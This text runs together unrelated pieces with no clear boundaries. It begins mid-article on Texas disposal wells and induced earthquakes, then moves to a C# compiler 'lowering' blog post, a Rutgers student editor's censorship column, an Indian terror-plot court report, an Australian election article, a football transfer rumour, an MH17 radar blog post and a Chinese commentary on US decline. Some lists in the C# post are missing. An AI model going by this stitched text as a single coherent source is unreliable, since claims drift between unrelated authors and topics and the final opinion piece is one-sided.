And an earlier study by scientists at Southern Methodist University (SMU) and UT found links between disposal wells near the DFW airport and induced earthquakes for a series of quakes in 2008 and 2009. The study specifically looked at two injection wells in the area that were built in 2008. Seven weeks later, earthquakes started. “Were the DFW earthquakes natural or triggered by activities associated with natural gas production, most likely saltwater injection to dispose of brines?” the report asked. The study said yes, the “correlations are consistent with an induced or triggered source.”
The quakes studied from that two-year period were all 3.0 magnitude or below, but in the years since there have been several quakes above 3.0 in the area, going as high as 3.5. There have been more than fifty earthquakes in the area since 2008.
It's important to note that the earthquakes haven't caused any reported significant damage. Generally an earthquake has to be magnitude 4.0 or higher to cause damage. But locals in the Dallas-Fort Worth area are disturbed and concerned about the trend of manmade seismic activity.
And there's the open question of what kind of damage these induced quakes can do to drilling infrastructure. It's plausible that the tremors could affect well integrity, Frohlich says. “In my business, you never say never. That said, most of the time these earthquakes are not right near the well. But it's possible an earthquake could hurt a well,” he says, though he knows of no instances where that's occurred.
It's also important to note that there a ten of thousands of injection and disposal wells in Texas, yet only a few dozen of them are suspected of inducing quakes. It's also true that disposal and injection wells have been known to induce seismic activity since the 1960s. What's happening now is that with the rise of fracking, there is a need for more disposal wells. And in areas where fracking waste water is disposed of near population areas, it's going to be noticed more.
Recent Earthquakes in Texas
South Texas experienced a magnitude 4.8 earthquake in Oct. 2011 near the Eagle Ford Shale Play, which is home to over 550 gas wells. There have been many other earthquakes linked to injection wells in the Dallas-Fort Worth area, over 50 since 2008. There were no earthquakes before then. The most recent quake was 3.0 magnitude on January 22, just outside the DFW airport. You can read about other recent quakes in the stories below.
And the quakes aren't limited to Texas. Ohio experienced a magnitude 4.0 earthquake earlier this year near the town of Youngstown. The New York Times reported that Ohio officials believe this quake, the eleventh such event in Youngstown in 2011, was the result of disposal wells. Ohio stores much of Pennsylvania's fracking waste in those wells.
Are the earthquakes getting bigger?
Art McGarr, of the US Geological Survey's Earthquake Science Center, has been looking at whether the amount of fluid stored in a disposal well affects the strength of an earthquake. The question is that as wastewater stays in the disposal wells longer and more and more fluids are added, will the quakes become stronger?
His answer: they will.
“I think we're at the point when, if you tell me that you want to inject a certain amount of waste water, for example a million cubic meters for a particular activity, I can tell you that the maximum magnitude is going to be five (on the rictor scale) or less. I emphasize or less,” McGarr said in a recent presentation.
The findings contradict the notion that the rate at which waste fluids are injected in a disposal well impacts the chance of quakes, but it raises another concern. If the findings are correct, they mean the longer a disposal well is injected with fluid, the greater the likelihood of a stronger quake. That means that older wells still in use across Texas and the rest of the country could be growing more and more prone to producing larger earthquakes.
“With time, as an injection activity continues, so will the seismic hazard as measured by the maximum magnitude,” said McGarr at the close of his presentation.
Fracking Can Cause Earthquakes, Too
Photo courtesy of Dr. Frohlich
Dr. Cliff Frohlich, Associate Director of and Senior Research Scientist at the Institute of Geophysics at the University of Texas at Austin, says that while just a year ago he would have never said fracking itself causes earthquakes, now he thinks differently. “In the last year there have three well-documented earthquakes that occurred during the frack job and were probably related to fracking. They were all small earthquakes – of a magnitude of 2 or 3 – and, considering, that there are millions of frack jobs, fracking-related earthquakes are so rare,” he told StateImpact Texas.
“The last thing a frack engineer wants is to have the fluids go through a fault and go somewhere,” he said. “It's like pouring water through a drain. So if you're a frack engineer's doing their job, they're avoiding faults, and they're trying to bust up area rather than having the fluids move somewhere. People injecting are less concerned about that. They're trying to get rid of it, so they want a very porous material where fluids can flow away across long distances. So they're more likely to get to a fault.”
Earthquakes directly linked to fracking have been rare. That hasn't been the case with disposal wells used to get rid of fracking wastewater, however.
What Can Be Done to Prevent Drilling-Related Earthquakes?
Even if the earthquakes aren't getting bigger, the growing scientific link between disposal wells and induced earthquakes has made many residents nervous. In response, some policymakers are searching for solutions.
A report out from the National Research Council referenced a nine year-old checklist of best practices for drillers and disposal well operators. That includes investigating the site's history of earthquakes and its proximity to fault lines. But it included the observation that “government agencies and research institutions may not have sufficient resources to address unexpected (seismic) events.”
At a June 2012 Texas House Committee on Energy Resources hearing, state policymakers heard recommendations on what can be done to mitigate the risk of induced earthquakes. Melinda Taylor was one of the experts to give testimony. Taylor directs the Center for Global Energy, International Arbitration, & Environmental Law. She says other states have more safeguards in place against unwanted earthquakes.
In Ohio, for example, well operators need to do a “fairly detailed analysis of the geological conditions” before the state's regulatory agency offers a permit to authorize a new disposal well. “So they can determine whether or not it's likely to cause problems,” Taylor says.
What Can Texas Regulators Do?
Taylor also said the Texas Railroad Commission, which regulates oil and gas drilling in the state, may want to consider mandating setbacks, to ensure greater distance between disposal wells and public drinking water supplies, structures, and natural resources.
But as StateImpact Texas reported in January 2013, Texas regulators are largely ignoring the problem.
In a December 2012 forum hosted by the Texas Tribune, Railroad Commission Chair Barry Smitherman said he was aware of what he called “allegations” of a link between disposal wells and quakes.
“I know there are a number of studies being done and I think the University of Texas is doing one, and I'm anxious to see what kind of results we're going to get,” he said in response to a question from StateImpact Texas. That study was released several months before, in August 2012.
That ‘wait and see' approach is very close to the public position the Commission has taken previously. In an email to StateImpact Texas, Commission spokesperson Ramona Nye wrote that staff welcomes more data about “theories that hypothesize” a causation between seismic events and injection wells. But the Commission would not make any staff members available for interview.
To figure out how seriously the Commission was taking man-made earthquakes, StateImpact Texas filed open records requests for Commission emails relating to the subject.
The 111 pages of emails the Commission supplied show that staff members there accept what scientists and oilmen have known for decades: Injection wells can cause earthquakes. They even show staff members in communication with EPA researchers over certain quakes. The messages include forwards of media reporting on earthquakes and notes of concern from Texans.
Then the emails stop.
The last email about earthquakes that the Railroad Commission has on record was dated August 6, 2012. There was no record of electronic communication about the quakes that hit the Dallas area in late September, nor about quakes that hit North Texas in October, November or December.
The Railroad Commission is starting the process of writing new rules about disposal wells. But in an email to StateImpact Texas, the Commission said those proposed amendments “do not address seismic activity.”
Frolich, the UT expert on man-made earthquakes, had one last suggestion on how to mitigate unwanted quakes: find new ways of disposing drilling related wastewater.
“If disposal is causing earthquakes you can find a different way of dispose of it. You can dispose of the stuff in a different well, or you can even take it to a fluid treatment plant,” Frolich said.
Of course, companies' willingness to do that will depend largely on cost and state regulation.
“The people involved in this [disposal well operation] are going to do the cheapest way of doing things that is generally considered safe,” said Frolich.
This article was reported and researched by StateImpact Texas reporters, Kelly Connelly of KUT News, and David Barer and Yana Skorobogatov of StateImpact Texas and Reporting Texas.
Lowering in the C# Compiler (and what happens when you misuse it)
Turns out that what I'd always thought of as “Compiler magic” or “Syntactic sugar” is actually known by the technical term ‘Lowering' and the C# compiler (a.k.a Roslyn) uses it extensively.
But what is it? Well this quote from So You Want To Write Your Own Language? gives us some idea:
Lowering One semantic technique that is obvious in hindsight (but took Andrei Alexandrescu to point out to me) is called “lowering.” It consists of, internally, rewriting more complex semantic constructs in terms of simpler ones. For example, while loops and foreach loops can be rewritten in terms of for loops. Then, the rest of the code only has to deal with for loops. This turned out to uncover a couple of latent bugs in how while loops were implemented in D, and so was a nice win. It's also used to rewrite scope guard statements in terms of try-finally statements, etc. Every case where this can be found in the semantic processing will be won for the implementation. – by Walter Bright (author of the D programming language)
But if you're still not sure what it means, have a read of Eric Lippert's post on the subject, Lowering in language design, which contains this quote:
A common technique along the way though is to have the compiler “lower” from high-level language features to low-level language features in the same language.
As an aside, if you like reading about the Roslyn compiler source you may like these other posts that I've written:
What does ‘Lowering' look like?
The C# compiler has used lowering for a while, one of the oldest or most recognised examples is when this code:
using System.Collections.Generic ; public class C { public IEnumerable < int > M () { foreach ( var value in new [] { 1 , 2 , 3 , 4 , 5 }) { yield return value ; } } }
is turned into this
public class C { [ CompilerGenerated ] private sealed class < M > d__0 : IEnumerable < int >, IEnumerable , IEnumerator < int >, IDisposable , IEnumerator { private int <> 1 __state ; private int <> 2 __current ; private int <> l__initialThreadId ; public C <> 4 __this ; private int [] <> s__1 ; private int <> s__2 ; private int < value > 5 __3 ; int IEnumerator < int >. Current { [ DebuggerHidden ] get { return this .<> 2 __current ; } } object IEnumerator . Current { [ DebuggerHidden ] get { return this .<> 2 __current ; } } [ DebuggerHidden ] public < M > d__0 ( int <> 1 __state ) { this .<> 1 __state = <> 1 __state ; this .<> l__initialThreadId = Environment . CurrentManagedThreadId ; } [ DebuggerHidden ] void IDisposable . Dispose () { } bool IEnumerator . MoveNext () { int num = this .<> 1 __state ; if ( num != 0 ) { if ( num != 1 ) { return false ; } this .<> 1 __state = - 1 ; this .<> s__2 ++; } else { this .<> 1 __state = - 1 ; this .<> s__1 = new int [] { 1 , 2 , 3 , 4 , 5 }; this .<> s__2 = 0 ; } if ( this .<> s__2 >= this .<> s__1 . Length ) { this .<> s__1 = null ; return false ; } this .< value > 5 __3 = this .<> s__1 [ this .<> s__2 ]; this .<> 2 __current = this .< value > 5 __3 ; this .<> 1 __state = 1 ; return true ; } [ DebuggerHidden ] void IEnumerator . Reset () { throw new NotSupportedException (); } [ DebuggerHidden ] IEnumerator < int > IEnumerable < int >. GetEnumerator () { C .< M > d__0 < M > d__ ; if ( this .<> 1 __state == - 2 && this .<> l__initialThreadId == Environment . CurrentManagedThreadId ) { this .<> 1 __state = 0 ; < M > d__ = this ; } else { < M > d__ = new C .< M > d__0 ( 0 ); < M > d__ .<> 4 __this = this .<> 4 __this ; } return < M > d__ ; } [ DebuggerHidden ] IEnumerator IEnumerable . GetEnumerator () { return this . System . Collections . Generic . IEnumerable < System . Int32 >. GetEnumerator (); } } [ IteratorStateMachine ( typeof ( C .< M > d__0 ))] public IEnumerable < int > M () { C .< M > d__0 expr_07 = new C .< M > d__0 (- 2 ); expr_07 .<> 4 __this = this ; return expr_07 ; } }
Yikes, I'm glad we don't have to write that code ourselves!! There's an entire state-machine in there, built to allow our original code to be halted/resumed each time round the loop (at the ‘yield' statement).
The C# compiler and ‘Lowering'
But it turns out that the Roslyn compiler does a lot more ‘lowering' than you might think. If you take a look at the code under ‘/src/Compilers/CSharp/Portable/Lowering' (VB.NET equivalent here), you see the following folders:
Which correspond to some C# language features you might be familar with, such as ‘lambdas', i.e. x => x.Name > 5 , ‘iterators' used by yield (above) and the async keyword.
However if we look at bit deeper, under the ‘LocalRewriter' folder we can see lots more scenarios that we might never have considered ‘lowering', such as:
So a big thank-you is due to all the past and present C# language developers and designers, they did all this work for us. Imagine that C# didn't have all these high-level features, we'd be stuck writing them by hand.
It would be like writing Java :-)
What happens when you misuse it
But of course the real fun part is ‘misusing' or outright ‘abusing' the compiler. So I set up a little twitter competition just how much ‘lowering' could we get the compiler to do for us (i.e the highest ratio of ‘input' lines of code to ‘output' lines).
It had the following rules (see this gist for more info):
You can have as many lines as you want within method M() No single line can be longer than 100 chars To get your score, divide the ‘# of expanded lines' by the ‘# of original line(s)' Based on the default output formatting of https://sharplab.io, no re-formatting allowed!! But you can format the intput however you want, i.e. make use of the full 100 chars Must compile with no warnings on https://sharplab.io (allows C# 7 features) But doesn't have to do anything sensible when run You cannot modify the code that is already there, i.e. public class C {} and public void M() Cannot just add async to public void M() , that's too easy!! You can add new using ... declarations, these do not count towards the line count
For instance with the following code (interactive version available on sharplab.io):
using System ; public class C { public void M () { Func < string > test = () => "blah" ?. ToString (); } }
This counts as 1 line of original code (only code inside method M() is counted)
This expands to 23 lines (again only lines of code inside the braces ( { , } ) of class C are counted.
Giving a total score of 23 (23 / 1)
.... public class C { [ CompilerGenerated ] [ Serializable ] private sealed class <> c { public static readonly C .<> c <> 9 ; public static Func < string > <> 9 __0_0 ; static <> c () { // Note: this type is marked as 'beforefieldinit'. C .<> c .<> 9 = new C .<> c (); } internal string < M > b__0_0 () { return "blah" ; } } public void M () { if ( C .<> c .<> 9 __0_0 == null ) { C .<> c .<> 9 __0_0 = new Func < string >( C .<> c .<> 9. < M > b__0_0 ); } } }
Results
The first place entry was the following entry from Schabse Laks, which contains 9 lines-of-code inside the M() method:
using System.Linq ; using Y = System . Collections . Generic . IEnumerable < dynamic >; public class C { public void M () { (( Y ) null ). Select ( async x => await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await await x . x ()()); } }
this expands to an impressive 7964 lines of code (yep you read that right!!) for a score of 885 (7964 / 9). The main trick he figured out was that adding more lines to the input increased the score, i.e is scales superlinearly. Although if you take things too far the compiler bails out with a pretty impressive error message:
error CS8078: An expression is too long or complex to compile
Here's the Top 6 top results:
* = member of the Roslyn compiler team (they're not disqualified, but maybe they should have some kind of handicap applied to ‘even out' the playing field?)
Honourable mentions
However there were some other entries that whilst they didn't make it into the Top 6, are still worth a mention due to the ingenuity involved:

Well, that's kind of the point.
This was supposed to be my traditional goodbye column before my term as the opinions editor came to an end last week, but it was censored by my own workplace, from the very section of which I was the editor. The new Targum editorial staff is fully aware and supportive of this now being published.
Before I became the opinions editor and made the Targum's editorial office my permanent residence, I spent my high school days and college life building bridges between different cultural and religious communities.
Before heading to Rutgers, I was awarded the Daniel Pearl Scholarship from my hometown's synagogue for my work on increasing tolerance. I founded my blog, MuslimGirl.net's first student chapter at Rutgers -- the first of many developing sister chapters across several states -- with the mission of "promoting interfaith dialogue through the spirit of sisterhood." When I planned our first interfaith event during my sophomore year, I invited Hillel's Senior Associate Director Rabbi Esther Reed to speak on behalf of Rutgers' Jewish community because I was proud to see a woman blazing a trail in her faith. I became a regular in religious, cultural and social justice organizations that I felt would cultivate a more tolerant campus environment.
Thus, when I was approached during my junior year to run for the Targum's opinions editor position in the hopes of making it as inclusive and reflective of all campus opinions as possible, I was ecstatic and I won the position.
I was the only Arab on the 145th editorial board. I wear a scarf on my head. I believe it was in part because of these things and the polarized political environment at Rutgers that I was placed under a microscope as soon as I took up my position as opinions editor. There is strong evidence to support the claim. My superiors, and especially interested outside parties, were on top of me for any hint of showing a "bias" -- and remarkably enough, this interest was only shown when it concerned the topic of Israel. I think all of my colleagues will agree that none of them had to experience the same scrutiny.
My very first day on the job was met with controversy. A seemingly preemptive campaign was launched to prove that our newspaper was "biased against Israel" before I even had a chance to do my job, which I almost lost during my very first month for putting a letter from a Hillel member through the very same editing process that we put every letter we receive. That would be the first of many threats that my job came under throughout my term, each time as a result of publishing content that was not strictly in favor of Israel. The campaign displayed all the pro-Israel letters that came to my desk, comparing their original form to their edited version after publication in the Targum. It attempted to propagandize all the edits, attributed fully to me, as serving ulterior political motives -- when, really, the letters were either cut down in order to fit on the page or some parts didn't make it through our collective fact-checking process, a professional burden shared across several desks.
I gave pro-Israel letters the very same treatment I gave any other letters that came to my desk, yet that was not good enough for my critics or superiors.
Last semester, after Rutgers Students for Justice in Palestine passed out mock eviction notices on campus to raise awareness of Palestinian home demolitions, the Targum's Board of Trustees -- on which Rabbi Reed's mother is a voting member -- was in direct communication with Hillel over how they wanted the editorial content in my section to be published. They wanted me to publish a pro-Israel letter at the time of their choosing to benefit from increased readership -- an advantage that no other on- or off-campus organization receives. I was threatened with termination if I did not oblige the overbearing influence they were exerting over my editorial decisions.
In response, almost our entire editorial staff co-signed a letter denouncing this lack of journalistic integrity in our newspaper and planned to have it published in my section, only to be censored by the Board of Trustees, who said that they didn't want us to "air our dirty laundry."
The Board of Trustees' and pro-Israel organizations' deflective accusations against me that my editorial decisions are "biased" are unfounded. To the contrary, I have gone out of my way to publish opinions I disagree with. At the beginning of this semester, I received a commentary written by a Rutgers student with anti-Semitic undertones, questioning Hillel's funding and criticizing "the Jewish nature on campus" that I, as a Muslim Arab-American, was offended by, and that clashed with the interfaith work to which I have dedicated my college years. I selected that commentary for publication anyway.
I did so firstly because I refuse to censor any opinions, even ones that I may personally disagree with, and secondly because I knew the same type of poor reasoning expressed in the commentary was also applied to the treatment of other minority communities. I hoped that publishing it would result in a positive dialogue about tolerance of all religious and cultural groups on campus.
But, instead, members of Hillel exploited the opportunity not only to attack me personally, but also to establish an even larger control over the student newspaper.
The Board of Trustees privately accommodated Hillel's public display of bullying when Hillel's Executive Director Andrew Getraer responded to the Targum's arbitrary apology, in a letter that the board had no problem publishing. In it, Hillel demanded what amounts to its control over the Targum and its staff members. You didn't read it here first -- you can see the bullying and intimidation exerted over our staff in Getraer's own words in his Jan. 29 commentary.
In the Board of Trustees' private response to Hillel, which Hillel publicized in a press release on its website, it is stated that the board will be taking the unprecedented and "unusual step of requiring the editor-in-chief to submit all letters and commentary [on Israel/Palestine] to the board for approval before they can be published." This is the unjustifiable -- and hidden -- way that the Board is responding to an anti-Semitic commentary written by a Rutgers student, which questioned the funding of Hillel and had absolutely nothing to do with the Israeli-Palestinian conflict.
The Board of Trustees is not only catering to the sole requests of Hillel, but is also exercising an overarching and seemingly limitless power over editorial content -- positioning itself for an unchecked exercise of censorship. Not only has the board been a complete enigma to the editorial staff and public and criticized for its lack of transparency, but information about its membership, capabilities and the limits of its editorial discretion are convoluted and not outlined anywhere on the Targum website.
When I approached those more knowledgeable than I about the misconduct I was witnessing, people were angry. Rutgers faculty members were outraged and willing to take action against what one professor said was a journalistic "crisis." Toby Jones, who teaches modern Middle Eastern history and directs the Center for Middle Eastern Studies at Rutgers, was outraged by both the terms of political debate and the apparent intimidation and threat to free speech against the student newspaper. In addition, he said he "was also disappointed, given the claims of intimidation and the censorship attested to by some of the Targum's editorial staff, that the newspaper's leadership of what is supposed to be an independent outlet for aspiring journalists and that should resist encroachment on these things, allowed it all to happen." Legal teams said that going public about what I was experiencing would be a powerful move. Advocacy groups said that they would fully support me in moving forward.
All of these things were aligned in my favor -- the favor of integrity, of honesty, of transparency. My finger was on the trigger.
And I flinched.
I didn't pull it. I stayed silent. I let the moment pass. Because, as ashamed as I am to admit it, I was scared.
Political organizations on campus with immeasurable power are terrifying. Unlike comfortably tenured professors, we students are vulnerable. We're left totally and completely exposed in a media arena where we are unarmed while Goliaths have entire nationally-funded arsenals at their hands. When my job was threatened because I did not want to change the publication schedule according to Hillel's demand, in my head, there was no way I could fight against our well-connected Board of Trustees and other university bullies without getting obliterated.
I guess my experience echoes that of countless students across the country. Liz Jackson, an attorney who advises students on defending their speech rights, explained, "Unfortunately, Amani's story of intimidation, false accusations of bias, and censorship is common. Palestine Solidarity Legal Support formed in response to students like her from every corner of the country reporting that they could not speak honestly about Palestine on campus without facing legal and personal attacks. Legal bullying, intimidation and official censorship are escalating on campuses as critical discussion of Israeli policy becomes more common. The chilling effect can be devastating. Some students stand up to the pressure and some decide they'd rather stay quiet."
I will always have to live with the decision not to publicize the discriminatory treatment I received and the infringement on free speech that I witnessed. But, instead of being angry with myself for it, I am instead angry at the unjust framework that forced me into that position in the first place.
In an interview I did with NJTV about former men's basketball coach Mike Rice's exposed abuse and the surrounding controversy that hit our newspaper last year, I said that "especially when you take into consideration that a college campus is a microcosm of society as a whole, we should be focusing on the issues that cause these types of events to happen in the first place." The issue of stifling free speech on college campuses, especially when it comes to criticisms of Israel, plagues universities far beyond Rutgers and truly reflects the nature of our country's politics. Just as Israel-aligned organizations are suffocating the dialogue on Israel down here on campus, so too are they doing the same up there in our governmental institutions.
One way that this is happening is by politicizing the word "anti-Semitism" to silence criticism of Israel -- which has everything to do with political actions and nothing to do with religion. Even United States Secretary of State John Kerry, after merely acknowledging the existence of the Boycott, Divestment, and Sanction movement against Israel, was criticized as being "anti-Semitic," which prompted Ambassador Susan Rice to come to his defense against the "unfounded and unacceptable" attacks.
Using the label of "anti-Semitism" as a scare tactic to cancel political discourse of Israel not only cripples free speech and critical thought, but also undermines real, serious and painful experiences of anti-Semitism and other forms of racism in our society that deserve the utmost condemnation.
I don't know what will happen after this is published. I know that it's very likely such organizations will prove me right with another onslaught of attacks, or they could give us all a pleasant surprise. If this column had been published in the Targum as I originally planned, I would have expected the Board of Trustees to "retract" (read: retroactively censor) it within days.
While I was dealing with the thick of all this pressure two weeks ago, Rabbi Reed approached me to ask what I plan on doing after I graduate this semester. My only plan is to continue fighting for freedom of speech and marginalized narratives in our country. The personal attacks I've had to face prove that there is still much work to be done when it comes to increasing tolerance in our society, and the politics I've witnessed behind the scenes reveal that our First Amendment rights are more embattled than ever.
If anything, my experience at the Targum -- and the unprompted and hostile reaction to an Arab woman's seat at the table -- has taught me that the pen really is mightier than the sword. Thankfully, I'm walking out of there with enough ink in my pen to write another day.
LeT member sent to police custody in Delhi terror plot case
NEW DELHI, July 28 (Agencies): An alleged member of banned Lashkar-e-Toiba, serving life term in Kolkata for his role in the 2001 Partha Roy Burman kidnapping case, has been remanded in police custody till August 2 by a Delhi court in connection with a case of conspiracy to carry out terror attacks here.
District Judge I S Mehta allowed the plea of Special Cell of Delhi Police seeking six days' custodial interrogation of Asahbuddin alias Shaukat, who was produced in court from Kolkata Jail after a production warrant had been issued against him.
The police arrested Asahbuddin in connection with a case of conspiracy of LeT to kidnap a businessman or industrialist to generate funds for buying weapons and explosives to carry out terror attacks in the national capital.
The police told the court that earlier a charge sheet was filed against arrested accused Mohd Rashid and Mohd Shahid on May 8 this year and they were charged for offences of criminal conspiracy under the IPC and under the provisions of Unlawful Activities (Prevention) Act in the case.
It said that later on during the probe, absconding accused Abul Subhan was arrested on July 20 and he disclosed that he had contacted his nephew Asahbuddin, who was lodged in Kolkata Jail, for safe transfer of money through hawala route and also about financing of weapons from across the border through LeT network.
"Asahbuddin and one Arshad (a Pakistani terrorist lodged in Kolkata Jail) referred Abdul Subhan to their old terror comrade Javed Baluchi (who is still absconding), an important Lashkar commander based in Pakistan who also oversees the finances for his Tanzeem.
"After connecting Abdul Subhan with Javed Baluchi, the remaining action plan was to be discussed," it said, adding, Asahbuddin was required to be confronted with Subhan, who is also in police custody till August 2.
During the arguments, advocate M S Khan, who appeared for Asahbuddin, opposed the plea filed by police contending that his client was falsely implicated in the case and there was no evidence to connect him with it.
The judge, however, allowed the police's plea saying, "I am satisfied that accused (Asahbuddin) is required for custodial interrogation."
The police, in its application seeking six days' custodial interrogation of Asahbuddin, told the court that "the whole conspiracy to carry out terrorist activity in India is to be unearthed."
Asahbuddin along with Aftab Ansari, who was awarded death penalty in the 2002 American Center attack case, and others were sentenced to life imprisonment in 2001 Partha Roy Burman kidnapping case.
Shoe baron Partha Roy Burman was kidnapped in Kolkata on July 25, 2001. He was later released by the abductors. Special Cell had earlier chargesheeted Rashid and Shahid alleging that they had conspired with Subhan and Baluchi to plot a terrorist action in Delhi and adjoining areas.
Both the accused were arrested in December last year from Haryana's Mewat region. With their arrest, police had claimed to have unearthed a terror module of LeT which was at an "advanced stage" of planning a major strike in Delhi.
Regarding Baluchi, police had said that intelligence agencies had provided information in November last year that Baluchi was contacted on his Pakistani mobile number from Rajasthan and there were conversations regarding a conspiracy to carry out a terror strike in India.
Police had also claimed that Rashid had told the investigators about LeT's plan to execute a terror strike "on the anniversary of Babri Masjid demolition."
Election 2016: Number of women MPs in Federal Parliament rises
Updated
While the political complexion of the next federal government remains unclear, what is certain is that the number of women in the Lower House will increase.
There were 40 women in the House of Representatives of the last parliament.
That could rise to between 42 and 48 depending on the final count of Saturday's federal election results.
If the highest figure of 48 is reached, that would amount to women occupying 32 per cent of Lower House seats, up from about 26 per cent.
Long-time observers and advocates for equal representation in parliament have said the major parties overlooked women's issues during the election campaign, to their detriment.
Associate Professor Tony Krone, from the University of Canberra, told PM Australia's international gender equity ranking had improved, and was now sitting just above Algeria and on par with Switzerland.
"We are doing better on this but it's only marginally better, but it brings us from about 56th place to 37th place, amongst a fairly tightly arranged number of countries," Mr Krone said.
He said the incremental improvements are the result of quotas.
"The party that has led in terms of improving gender equality is the Labor Party. It's probably gone backwards for the Liberal Party, although we don't quite know yet with some seats in doubt, and the National Party didn't get any female candidates up," Dr Krone said.
"So that's what I think is important to draw, is the importance of quotas and positive action like that."
Mr Krone said for the women who have been elected into House of Representatives, the pressure will be on.
"The fact that we have more women in the parliament is terrific, but it's a big ask for them to pull out all of the [women's] issues," he said.
"It's got to be something that comes from both sides. It's got to be men and women worrying about issues for either sex."
Dr Marian Baird, professor of gender and employment relations at the University of Sydney, said the major parties failed to engage with women during the campaign.
"I think they both missed the opportunity to really reach out to women voters. There are a number of issues that women are really concerned about and they seemed to be overlooked in the campaign," Dr Baird said.
"We no longer have a gender analysis of the budget, we must have that back in again, because that draws attention to how policies impact on different groups in society."
Senior Coalition figures unavailable to women's media
Mia Freedman, co-founder of the Mamamia Women's Network, said Prime Minister Malcolm Turnbull and the Coalition squandered opportunities to actively engage with women.
"You look at the fact that Malcolm Turnbull and Julie Bishop wouldn't do interviews with a lot of mainstream media organisations with very high female readerships and audiences, like the Mamamia Women's Network," Freedman said.
"They all turned down repeated requests for interviews. To me, I don't know whether that was fear or arrogance or just some misguided belief that maybe they should be small targets, but everybody in the ALP was very, very available.
"So, that was a little bit of a mystery to us I have to say."
But Freedman said the issues of interest to women during the campaign were broad.
"It was everything from the economy, climate change, same-sex marriage, domestic violence, and then of course Medicare or the scare campaign around Medicare really hit home with women, as it did with men," she said.
"But there were a lot of the issues that our readers were very keen to talk about, particularly the social issues, and I think that was possibly a really lost opportunity for Malcolm Turnbull because he had huge, huge popularity before he became Prime Minister with women, and in those early days.
"But he lost that quite quickly because women felt sort of, and men I suppose, felt very disenfranchised when he really didn't seem to fulfil any of the hopes that were had about how he'd fall on issues like same-sex marriage."

Rossi set to snub Spurs as £10m Villarreal striker edges closer to Napoli move
Spurs target: Giuseppe Rossi
Tottenham are set to miss out on Giuseppe Rossi after the striker's agent dropped the strongest hint yet he will join Napoli.
Rossi has been linked with a move away from Villarreal for some time and Spurs boss Harry Redknapp is a known admirer of the £10million-rated Italian.
Several Premier League clubs have been tracking the former Manchester United player, who is out of action until the summer as he recovers from knee surgery, but the north Londoners were at the head of the queue.
However, Serie A now looks the most likely destination for the 25-year-old. Napoli could lose Ezequiel Lavezzi in the summer with a host of European big guns, including Manchester City and Liverpool, hovering over the Argentina forward.
Rossi would plug the gap and his agent Federico Pastorello told Radio Kiss Kiss: 'Lavezzi going to England and Rossi to Napoli? I cannot confirm, but it is a possibility that Lavezzi might leave Napoli.
'I cannot rule out Rossi joining Napoli. After five years at Villarreal, I think that all parties are more susceptible to listening to the offers that arrive.
'We will see, but one thing is clear: Villarreal are open to selling Rossi, and the player is ready to leave the club.'

Russia presented at September 26, two days before JIT would make public the first results of the criminal investigation into the downing of MH17, primary radar images to the public.
For a period of over two years Russian Federation claimed it destroyed these raw primary radar recordings.
The recordings showed there were no aircraft flying near MH17. According to Russia, the radar should have detected a missile launched from south of Snizhne. And because technical restrictions, the radar could not detect a missile launched from Zarochenskoe.
I debunked this reasoning in this comprehensive blogpost.
You would expect Russia to hand over the radar recordings as soon as possible. However the recordings were not received by JIT on October 5. Many weeks after the recordings were “found”.
Ukraine press confirms the story. JIT spokesman Wim de Bruin stated JIT did not receive radar recordings from Russia. JIT also stated they are not going to respond to the statements by the Russian Federation about the JIT investigation. The Dutch Ministry of Foreign Affairs will do the response.

As the US has lost more international status and influence since the global financial crisis in 2008, the international community is raising doubts about its leadership and ability to contribute to the world, an expert said, analyzing that such a decline of influence can be attributed to some deep-seated reasons, including its self-willed overseas military operations.
Since the financial crisis, the US can neither provide effective solutions to a host of global challenges, nor sustain its control over other countries, Zhang Ruizhuang, Director of the Center of American Studies at Nankai University, wrote in an article published in the People's Daily on Sunday.
In the commentary titled “The City upon a Hill is not there any more,” he gave an in-depth analysis on the reasons of such changes.
Zhang says that “A City upon a Hill,” often cited by American politicians as their political creed, verified the self-labelling of the arrogant Americans as “God's Chosen Ones” to lead the world. After the Cold War, the preaching about the superiority of its values brought US much popularity and pulled the country to a commanding stage.
But it over-consumed its accumulated political capital during the last quarter of the 20th century, which resulted in a decline in its global influence, Zhang said, adding that the most destructive threat to its dropping status can be attributed to overseas military operations.
After the Soviet Union collapsed with the end of the Cold War, the US dominated the world and launched a series of capricious measures. With the excuse of protecting democracy, human rights and the world order, Uncle Sam trampled on the post-war international law based on the UN Charter and norms governing global relations by bringing the flames of war to many parts of the world.
Panama, Somalia, Haiti and Kosovo are all victims of such wars waged by the superpower. With a made-up excuse, it pulled Iraq into a war and this political farce finally brought the latter millions of civilian casualties, endless terrorist attacks and ceaseless disturbance.
What the US gained, after it paid a price of trillions of dollars for the war, was a hotbed for terrorist organizations which in turn threatened the security of itself and other Western countries. The war against Iraq ultimately turned out to be a foolish one that not only crumbled its diplomatic morality, but undermined its own strategic interests, Zhang concluded.
Despite the lessons, the US never gave up every opportunity to start “color revolutions.” Its attacks on Libya and Syria, once again, dragged these nations into raging wars. What's worse, as a result of the wars, a number of regulation vacuums provided ISIS and other religious extremist organizations a bed in which to grow stronger.
The US, its Western allies, as well as the whole world, are now swallowing the sour fruits resulted from its self-willed deed, he added.
According to the scholar, apart from its frequent diplomatic mistakes, its economy, politics and society, in which the Americans once took pride, are all in a predicament, arising more doubts over the superiority of the US system.
The global financial crisis breaking out in 2008 exposed the defects of capitalism once again. It brought to light not only the failure of Keynesian policy to narrow the wealth gap and boost effective demand, but the greed and corruption of financial executives, the ineffectiveness of financial supervision, plus the government's shielding of tycoons.
The US public felt shock, despair and anger towards such defects, and the ensuing “Occupy Wall Street” movement is one of their ways to express dissatisfaction. The protest wave later spilled to other part of the world, triggering worldwide query over the US system and its values.
Zhang also criticized US domestic politics, citing its notorious presidential election system as an example.
Manipulated by capital, the “winner takes all” election system in many states gives no chance to other newborn parties besides the two major parties. The American elections of the past two to three decades have been more like technical games.
The candidates now focus more on technical details for the sake of more votes rather than their political ideas and governance philosophies, and the whole process has fallen into personal attacks between the two candidates, he added.
Coupled with some other faults, the US and even the whole world began to question on the effectiveness of US democracy, as well as its leader selected in such a flawed way.
The article analyzed that one key reason for its flopping election lies in a lack of innovative governing ideas.
Barely stimulated by major crisis, US society tends to be mediocre and conservative about its ideas, the commentary further explained, adding that the prevailing philosophy of so-called “political correctness” also created an unfavorable environment for the candidates to come up with new ideas acceptable to the public.
Lack of foresighted candidates with outstanding capability is another reason for its unsuccessful election, Zhang wrote.
